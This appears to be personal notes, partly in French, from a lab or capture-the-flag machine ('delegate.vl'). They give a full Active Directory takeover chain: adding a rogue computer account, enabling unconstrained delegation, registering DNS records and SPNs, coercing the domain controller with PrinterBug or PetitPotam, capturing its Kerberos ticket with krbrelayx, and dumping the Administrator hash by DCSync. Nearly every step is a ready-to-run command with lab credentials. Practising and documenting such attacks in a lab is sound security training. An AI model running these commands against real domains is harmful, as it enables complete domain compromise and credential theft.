**SeEnableDelegationPrivilege** - Powerful privilege for configuring delegation settings

**Attack Plan:**

1. Check MachineAccountQuota
2. Add malicious computer account
3. Configure unconstrained delegation
4. Add DNS record and SPNs
5. Use PrinterBug to coerce authentication
6. Capture TGT and perform DCSync

### A. Vérifier le  MachineAccountQuota
Par défaut, l'Active Directory autorise tous les utilisateurs du domaine à intégrer des ordinateurs dans le domaine, peu importe qu'il s'agisse d'un compte administrateur ou d'un compte utilisateur classique.
```bash 
# Identifier le quotat de compte machine
nxc ldap delegate.vl -u 'N.Thompson' -p 'KALEB_2341' -M maq

ldapsearch -x -H ldap://dc1.delegate.vl -D "N.Thompson@delegate.vl" -W -b "DC=delegate,DC=vl" "(objectClass=domain)" ms-DS-MachineAccountQuota
```

### B. Ajouter un compte ordinateur
```bash 
impacket-addcomputer -dc-ip 10.129.234.69 -computer-name PwnPC -computer-pass P@$$word123! delegate.vl/N.Thompson:KALEB_2341
```

### C. Configurer la délégation sans contrainte
Sous Linux
```bash
bloodyad -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host '10.129.234.69' add uac 'PwnPC$' -f TRUSTED_FOR_DELEGATION
```

Sous powershell 
```powershell
$computer = Get-ADComputer -Identity "PwnPC"
Set-ADAccountControl -Identity $computer -TrustedForDelegation $true
Get-ADComputer -Identity "PwnPC" -Properties TrustedForDelegation | Select-Object Name, TrustedForDelegation
```

### D. Configuration DNS et SPN
ref outil : https://github.com/dirkjanm/krbrelayx
Attention au mot de passe qui aurrait pu etre changé lors de l'ajout du PwnPC

```
PwnPC$:P@7700word123!
```


```bash
python dnstool.py -u 'delegate.vl\PwnPC$' -p 'P@7700word123!' -r PwnPC.delegate.vl -d 10.10.14.136 --action add -dns-ip 10.129.234.69 dc1.delegate.vl
python dnstool.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -r PwnPC.delegate.vl -a add -t A -d 10.10.14.136 -dns-ip 10.129.234.69 DC1.delegate.vl
```

```bash
python addspn.py DC1.delegate.vl -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/PwnPC.delegate.vl' -t 'PwnPC$' -dc-ip 10.129.234.69 --additional
python addspn.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -s 'cifs/PwnPC.delegate.vl' -t PwnPC$ -dc-ip 10.129.234.69 DC1.delegate.vl --additional
python addspn.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -s 'cifs/PwnPC.delegate.vl' -t PwnPC$ -dc-ip 10.129.234.69 DC1.delegate.vl
```

Vérification de l'activation du SPN 
sous Windows
```powershell
Get-ADComputer -Identity "PwnPC" -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames
```

sous Linux 
```bash 
bloodyad -d delegate.vl --dc-ip 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' get object 'PwnPC$' --attr 'servicePrincipalName'
netexec ldap 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' --query "(servicePrincipalName=*)" "sAMAccountName servicePrincipalName"

```


### E. Recupération du ticket kerberos avec KrbRelayX

Identifier les vulnérabilités possibles sur cette technique
```bash 
netexec smb dc1.delegate.vl -u 'PwnPC$' -p 'P@7700word123!' -M coerce_plus
```

#### E.0 -  Récupération d'un hash du mot de passe
```python
python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "P@$$word123!".encode("utf-16le")).digest()).decode())
```

```bash 
sudo python krbrelayx.py --krbsalt 'DELEGATEevil' --krbpass 'P@7700word123!' --interface-ip 10.10.14.136

python3 ./krbrelayx/krbrelayx.py -hashes :868cc835d19a9e9ffb7adbc0b2f6ef4f
```



#### E.1 - Utilisation de printbug pour déclencher l'authentification sur notre machine
```bash
python printerbug.py delegate.vl/N.Thompson:KALEB_2341@dc1.delegate.vl PwnPC.delegate.vl
netexec smb dc1.delegate.vl -u 'PwnPC$' -p 'P@7700word123!' -M coerce_plus -o LISTENER=PwnPC.delegate.vl METHOD=PrinterBug
```


#### E.2 - Utilisation de PetitPotam pour déclencher l'authentification sur notre machine
```bash 
git clone https://github.com/topotam/PetitPotam.git
python PetitPotam.py -u PwnPC$ -p 'P@7700word123!' -d delegate.vl -dc-ip 10.129.234.69 PwnPC.delegate.vl 10.129.234.69
```


### F. DCSync attack avec le ticket récupérer
```bash 
# Set the Kerberos ticket
# Etre dans le dossier ou se trouve le ticket
export KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'

# Dump domain secrets
impacket-secretsdump -k -no-pass -just-dc-ntlm -just-dc-user Administrator 'DC1$@dc1.delegate.vl'
```

